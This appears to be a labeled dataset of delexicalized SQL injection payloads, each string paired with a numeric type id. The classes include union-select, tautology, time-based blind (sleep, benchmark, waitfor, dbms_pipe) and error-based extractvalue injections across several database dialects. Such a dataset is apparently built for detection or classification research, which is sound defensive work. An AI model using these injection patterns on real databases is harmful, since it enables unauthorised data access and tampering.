payload_delex,type_id
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) and __IDENT__",2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__IDENT__ __IDENT__ __INT__ ,",0
"__INT__"" ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) #",6
"-__INT__"" or __INT__ = __INT__",2
delete from __IDENT__,2
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ ) or sleep ( __time__ ) #,6
"-__INT__' + ( select __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __INT__ ;",2
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
__INT__' ) as __IDENT__ where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"-__INT__"" ) ) or __INT__ = __INT__#",2
"__INT__ ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
-__INT__ order by __INT__#,0
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
__IDENT__' or __INT__ = __INT__,2
"__INT__ % ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( % __STR__",2
-__INT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
__IDENT__',2
"-__INT__ % "" ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ --",7
-__INT__' order by __INT__#,0
"__INT__ % ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( % __STR__",2
-__INT__ % __STR__ % __STR__,2
__INT__' ) where __INT__ = __INT__ order by __INT__ --,0
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
"__INT__ % ' or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ % __IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"-3226__STR__ykdw' where __INT__ = __INT__ union all select __INT__ , __INT__ --",7
"__INT__ and elt ( __INT__ = __INT__ , __INT__ ) -- __IDENT__",2
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
delete from __IDENT__ where __IDENT__ = __STR__,2
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__#",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __STR__ = '__IDENT__",2
"-1876__STR__itfc' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
delete from __IDENT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__ and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and __IDENT__",6
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
__INT__ % ) waitfor __IDENT__ __TIME____STR__ % __STR__,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ )",3
"-__INT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__#",7
delete from __IDENT__ where __IDENT__ = __STR__,2
-__INT__ ) order by __INT__#,0
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
-2307__STR__fyok__STR__fyok,2
"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__ or __INT__ = __INT__,2
"__INT__ ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",6
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ union all select null , null --",7
"__INT__"" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
waitfor __IDENT__ __STR__ and ( ( ( __STR__ like '__IDENT__,6
__INT__ % ' ) ) and __INT__ = __INT__,2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __STR__ = ""__IDENT__",2
"__INT__"" where __INT__ = __INT__ order by __INT__#",0
"__INT__ ) and elt ( __INT__ = __INT__ , __INT__ ) and ( __IDENT__",2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
"__INT__ % ' ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
-__INT__ or __INT__ = __INT__#,2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
__INT__ % ' order by __INT__ --,0
"__INT__' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__' ) or __INT__ = __INT__ --,2
"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ --",7
-__INT__ % __STR__ % __STR__,2
"__IDENT__ or __INT__ = __INT__ -- """,2
"__INT__ % "" and __INT__ = __INT__ --",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__ % ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( ( % __STR__",2
__INT__ and sleep ( __INT__ ) and __IDENT__,6
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__"" where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__IDENT__ __IDENT__ __IDENT__ , __INT__",0
__INT__ % ' ) and __INT__ = __INT__ --,2
__INT__ ) where __INT__ = __INT__ waitfor __IDENT__ __STR__ --,6
__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,0
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__' ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __IDENT__",6
"__INT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null --",7
"__INT__ % ' or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
1__STR__mrge__STR__mrge,2
-__INT__ % ' ) ) or __INT__ = __INT__,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"-__INT__ % "" ) ) ) or __INT__ = __INT__ --",2
"__INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
"-__INT__"" where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
1__STR__nhld__STR__nhld,2
"__INT__ ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( __IDENT__",6
"__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null#",7
__INT__ ) ) ) order by __INT__#,0
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
__INT__ ) ) or sleep ( __INT__ ) and ( ( __INT__ = __INT__,6
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __INT__ = __INT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"update __IDENT__ set column = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"__INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and __IDENT__",2
__INT__ waitfor __IDENT__ __TIME__ and __IDENT__,6
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__' in __IDENT__ __IDENT__ ) and elt ( __INT__ = __INT__ , __INT__ ) #",2
"__INT__ where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-5158__STR__noaj__STR__noaj,2
"-__INT__ union all select __INT__ , __INT__ , __INT__ --",7
; __IDENT__ dbms_lock . sleep ( [__IDENT__] ) ; end ; __IDENT__ if ( [__IDENT__] ) then dbms_lock . sleep ( [__IDENT__] ) ; else dbms_lock . sleep ( __INT__ ) ; end if ; end,6
"-__INT__"" ) ) order by __INT__ --",0
__INT__ ) ) ) or sleep ( __INT__ ) and ( ( ( __IDENT__,6
"__INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
create __IDENT__ __IDENT__ __IDENT__ by __IDENT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__,0
-__INT__' or __INT__ = __INT__,2
-7923__STR__szct__STR__szct,2
"__INT__' in __IDENT__ __IDENT__ ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
__INT__' ) ) order by __INT__#,0
"-__INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) -- __IDENT__",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__#",7
__INT__ % ) rlike sleep ( __INT__ ) and ( % __STR__,6
end and __STR__ = '__IDENT__,2
"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __IDENT__",6
__INT__ % ) ) ) and sleep ( __INT__ ) and ( ( ( % __STR__,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"1__STR__qvif' where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null#",7
__INT__ % ) rlike sleep ( __INT__ ) and ( % __STR__,6
__INT__ ) order by __INT__ --,0
"-__INT__"" ) ) ) union all select __INT__ --",7
-__INT__ % ' or __INT__ = __INT__,2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"-__INT__' ) ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ --",7
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
__IDENT__' and __IDENT__ is null,2
"__INT__ ) where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-2289__STR__ised__STR__ised,2
-__INT__' ) ) ) or __INT__ = __INT__,2
"-__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"-__INT__' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__ ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__' ) where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"-__INT__' ) ) union all select __INT__ , __INT__ , __INT__ --",7
select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,7
__INT__ % ) and sleep ( __INT__ ) and ( % __STR__,6
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
__INT__' ) where __INT__ = __INT__ and __INT__ = __INT__ --,2
1__STR__tmng__STR__tmng,2
"__INT__"" where __INT__ = __INT__ and __INT__ = __INT__",2
-__INT__ or ( __INT__ = __INT__ ) * __INT__ -- __IDENT__,2
"__INT__ % "" ) ) order by __INT__ --",0
-5174__STR__ygee__STR__ygee,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__"" ) ) union all select null , null , null , null , null , null , null , null --",7
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
-__INT__' ) or __INT__ = __INT__#,2
"__INT__"" where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ % ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( % __STR__",2
"-__INT__"" ) or __INT__ = __INT__#",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) )",6
"-__INT__"" ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__"" rlike sleep ( __INT__ )",6
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__#",2
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and __IDENT__",6
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) -- __IDENT__",2
__INT__' ) and __INT__ = __INT__#,2
-6041__STR__hxjf__STR__hxjf,2
"-__INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
delete from __IDENT__ where __IDENT__ = __STR__,2
"__INT__ % "" ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ % or sleep ( __INT__ ) and % __STR__,6
1__STR__rgcv__STR__rgcv,2
"-__INT__ ) or __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( __INT__ = __INT__",2
) or sleep ( __time__ ) =,6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
__INT__' ) ) and __INT__ = __INT__,2
"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__",2
-__INT__ or ( __INT__ = __INT__ ) * __INT__,2
"-__INT__"" or __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" ) ) and sleep ( __INT__ ) #",6
"and elt ( [__IDENT__] = [__IDENT__] , [__IDENT__] ) and elt ( [__IDENT__] , [__IDENT__] )",2
"__INT__ ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' ) ) and __INT__ = __INT__#,2
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__' in __IDENT__ __IDENT__ ) and ( __INT__ = __INT__ ) * __INT__#,2
"__INT__ % ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( % __STR__",6
"__INT__' ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ or __INT__ = __INT__ --,2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null#",7
"__INT__ % "" ) order by __INT__#",0
-__INT__ or __INT__ = __INT__# __IDENT__,2
__INT__ % ' ) ) order by __INT__ --,0
-__INT__ or __INT__ = __INT__# __IDENT__,2
"-__INT__' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"-__INT__ ) where __INT__ = __INT__ union all select __INT__ , __INT__#",7
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --",6
"__INT__ ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __INT__ = __INT__",2
1__STR__qkrv__STR__qkrv,2
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and __STR__ = """,2
"__INT__ ) where __INT__ = __INT__ union all select null , null , null , null --",7
__INT__ ) ) and sleep ( __INT__ ) and ( ( __IDENT__,6
"__INT__ % ' ) ) union all select null , null , null , null , null , null , null , null#",7
"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( __IDENT__",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null#",7
__INT__ % ' ) and __INT__ = __INT__#,2
-__INT__' ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
__INT__' ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --,2
-__INT__' ) order by __INT__#,0
